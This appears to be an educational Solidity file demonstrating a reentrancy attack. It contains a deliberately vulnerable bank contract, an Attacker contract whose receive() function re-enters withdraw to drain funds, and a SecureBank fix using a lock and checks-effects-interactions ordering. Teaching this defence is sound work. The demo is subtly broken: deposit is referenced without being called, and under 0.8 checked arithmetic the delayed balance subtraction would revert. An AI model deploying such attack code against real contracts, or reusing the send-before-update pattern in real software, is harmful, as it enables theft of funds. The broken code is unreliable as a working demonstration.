// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableBank{
    mapping(address => uint) balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transaction failed");

        balances[msg.sender] -= _amount;
        }

        function getBalance() public view returns (uint){
            return address(this).balance;
        }
}

//Attacker Contract

    contract Attacker{
        VulnerableBank public bank;
        uint public constant AMOUNT_TO_DRAIN = 1 ether;

        constructor(address _bankAddress){
            bank = VulnerableBank(_bankAddress);
        }

        function attack() public payable {
            require(msg.value == AMOUNT_TO_DRAIN, "Send 1 ether to start the attack");
            bank.deposit{value: AMOUNT_TO_DRAIN};
            bank.withdraw(AMOUNT_TO_DRAIN);
        }

        receive() external payable {
            if(address(bank).balance >= AMOUNT_TO_DRAIN){
                bank.withdraw(AMOUNT_TO_DRAIN);
            }
         }

         function getBalance() public view returns(uint) {
            return address(this).balance;
         }
    }

    //Prevention of this attack - Contract

    contract SecureBank{
        mapping(address => uint) public balances;
        bool private locked;

        modifier noReentrant() {
            require(!locked, "No reentrancy");
            locked = true;
            _;
            locked = false;
        }

        function deposit() public payable {
            balances[msg.sender] += msg.value;
        }

        function withdraw(uint _amount) public noReentrant{
            require(balances[msg.sender] >= _amount, "Insufficient balance");

            balances[msg.sender] -= _amount;

            (bool success, ) = msg.sender.call{value: _amount}("");
            require(success, "Transaction failed");
        }

        function getBalance() public view returns (uint){
            return address(this).balance;
        }
    }
